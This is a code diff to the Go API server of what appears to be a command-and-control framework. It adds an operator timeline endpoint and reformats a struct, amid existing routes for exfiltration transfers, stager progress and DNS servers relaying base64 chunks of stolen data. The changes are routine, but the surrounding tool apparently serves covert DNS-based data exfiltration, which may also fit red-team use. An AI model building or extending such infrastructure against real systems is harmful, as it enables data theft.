@@ -2257,6 +2257,27 @@ func (api *APIServer) handleStats(w http.ResponseWriter, r *http.Request) {
 	api.sendJSON(w, stats)
 }
 
+// handleTimeline returns operation timeline events
+func (api *APIServer) handleTimeline(w http.ResponseWriter, r *http.Request) {
+	limit := 100
+	if limitStr := r.URL.Query().Get("limit"); limitStr != "" {
+		if parsed, err := strconv.Atoi(limitStr); err == nil && parsed > 0 && parsed <= 500 {
+			limit = parsed
+		}
+	}
+
+	events, err := api.db.GetTimeline(limit)
+	if err != nil {
+		api.sendError(w, http.StatusInternalServerError, "failed to retrieve timeline")
+		return
+	}
+
+	api.sendSuccess(w, "timeline retrieved", map[string]interface{}{
+		"events": events,
+		"count":  len(events),
+	})
+}
+
 // Exfiltration endpoints
 
 func (api *APIServer) handleListExfilTransfers(w http.ResponseWriter, r *http.Request) {
@@ -2930,9 +2951,9 @@ func (api *APIServer) handleStagerProgress(w http.ResponseWriter, r *http.Reques
 type MissingChunksRequest struct {
 	DNSServerID string            `json:"dns_server_id"`
 	APIKey      string            `json:"api_key"`
-	ID          string            `json:"id"`           // task_id or session_id
-	Type        string            `json:"type"`         // "task" or "exfil"
-	Chunks      map[string]string `json:"chunks"`       // chunk_index -> base64 data
+	ID          string            `json:"id"`     // task_id or session_id
+	Type        string            `json:"type"`   // "task" or "exfil"
+	Chunks      map[string]string `json:"chunks"` // chunk_index -> base64 data
 }
 
 // handleMissingChunks receives missing chunks from DNS servers
@@ -3069,6 +3090,7 @@ func (api *APIServer) SetupRoutes(router *mux.Router) {
 	operatorRouter.HandleFunc("/tasks/{id}/progress", api.handleGetTaskProgress).Methods("GET")
 	operatorRouter.HandleFunc("/tasks/{id}/status", api.handleGetTaskStatus).Methods("GET")
 	operatorRouter.HandleFunc("/stats", api.handleStats).Methods("GET")
+	operatorRouter.HandleFunc("/timeline", api.handleTimeline).Methods("GET")
 	operatorRouter.HandleFunc("/exfil/transfers", api.handleListExfilTransfers).Methods("GET")
 	operatorRouter.HandleFunc("/exfil/transfers/{id}", api.handleGetExfilTransfer).Methods("GET")
 	operatorRouter.HandleFunc("/exfil/transfers/{id}/download", api.handleDownloadExfilArtifact).Methods("GET")
